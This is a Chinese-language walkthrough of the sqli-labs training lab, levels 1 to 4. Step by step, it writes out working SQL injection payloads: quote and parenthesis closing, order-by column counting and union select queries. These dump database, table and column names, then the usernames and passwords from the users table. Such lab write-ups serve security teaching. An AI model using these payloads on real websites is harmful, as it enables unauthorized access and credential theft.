###Less-1（字符型注入）

0x00

首先注入：

?id=1

正常返回结果

由于要判断注入点，如图：

添加 ‘ 报错，证明有注入点，字符型，id=1’报错是由于源码当中接收值的时候本身自己就是id=’’的闭合形式，但由于我们自己强行在输入1的时候添加了1’，导致闭合之后形成了id=’1’’，导致报错。

0x01

执行下列语句进行绕过：

http://sqli-labs-master/Less-1/?id=1' or 1=1 --+

此时正常回显

0x02

接下来判断字段数，此处可以利用 order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。

执行以下语句：

http://sqli-labs-master/Less-1/?id=1' order by 3 --+

0x03

知道字段数之后，判断回显点，利用union联合注入：

当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据。

执行以下语句：

http://sqli-labs-master/Less-1/?id=-1' union select 1,2,3 --+

此时执行语句应该为：

select ************ where id=’-1’ union select 1,2,3–+’ LIMIT 0,1

回显点为2和3

0x04

接下来爆当前所在数据库名，爆版本号：

http://sqli-labs-master/Less-1/?id=-1' union select 1,database(),version()--+

0x05

根据版本特性，爆数据库：

http://sqli-labs-master/Less-1/?id=-1' union select 1,schema_name,3  from information_schema.schemata  --+

爆所有的数据库：

http://sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(schema_name),3  from information_schema.schemata  --+

0x06

由于爆出所在数据库名security，爆表名：

http://sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3  from information_schema.tables  --+

当前所在库的表：

http://sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema='security' --+

0x07

可以看到users这张表是存放用户名的表，接下来利用回显点3爆出列：

http://sqli-labs-master/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),(select group_concat(column_name) from information_schema.columns where table_name='users') from information_schema.tables  where table_schema='security' --+

爆表名语句：

select group_concat(table_name) from information_schema.tables where table_schema='security'

爆列名语句：

select group_concat(column_name) from information_schema.columns where table_name='users'

0x08

可以看到列的字段中出现了username和password两个字段，接下来爆用户名和密码：

http://sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from security.users--+

爆用户名语句：

select group_concat(username) from security.users

爆密码语句：

select group_concat(password) from security.users

Lees-2（数字型注入）

##0x00

先进行判断，执行下列语句：

http://sqli-labs-master/Less-2/?id=2

页面正常

0x01

注入：

http://sqli-labs-master/Less-2/?id=2  and 1=2 --+

页面异常，可得知为数字型注入。

0x02

判断字段数：

http://sqli-labs-master/Less-2/?id=2  order by 4 --+

http://sqli-labs-master/Less-2/?id=2  order by 3 --+

页面正常。

0x03

后续操作和字符型注入一样。

Lees-3

0x00

使用?id=’进行尝试注入：

http://sqli-labs-master/Less-3/?id='

注入代码后，我们得到像这样的一个错误：

MySQL server version for the right syntax to use near ””) LIMIT 0,1′

这里它意味着，开发者使用的查询是：

Select login_name, select password from table where id= (‘our input here’)

而源码当中也是如下：

SELECT * FROM users WHERE id=('$id') LIMIT 0,1

0x01

因此可以尝试这样注入：

http://sqli-labs-master/Less-3/?id=1')--+

页面返回正常

0x02

接下来可以判断字段数：

http://sqli-labs-master/Less-3/?id=1') order by 3 --+

0x03

判断回显点：

http://sqli-labs-master/Less-3/?id=-1') union select 1,2,3 --+

0x04

其实除了?id=1’)注入以外，根据源码可以判断出其他的注入语句：

') or '1'=('1'
) or 1=1 --+

第一句**’) or ‘1’=(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；

第二句) **or 1=1 –+通过注释符把后面的‘)**注释掉即可。

0x05

其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’)

Less-4

0x00

使用以下代码进行注入：

http://sqli-labs-master/Less-4/?id=1"

注入代码后，我们得到像这样的一个错误：

You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near '"1"") LIMIT 0,1' at line

这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。

查看源代码：

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

第一行id进行了””包装，之后第二行进行了()包装

0x01

再用如下代码注入：

http://sqli-labs-master/Less-4/?id=1") --+

页面返回正常

0x02

判断字段数：

http://sqli-labs-master/Less-4/?id=1")  order by 4--+

0x03

与Less-3一样，可成功注入的有：

“) or ”1”=(“1
“) or 1=1 --+

0x04

其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。
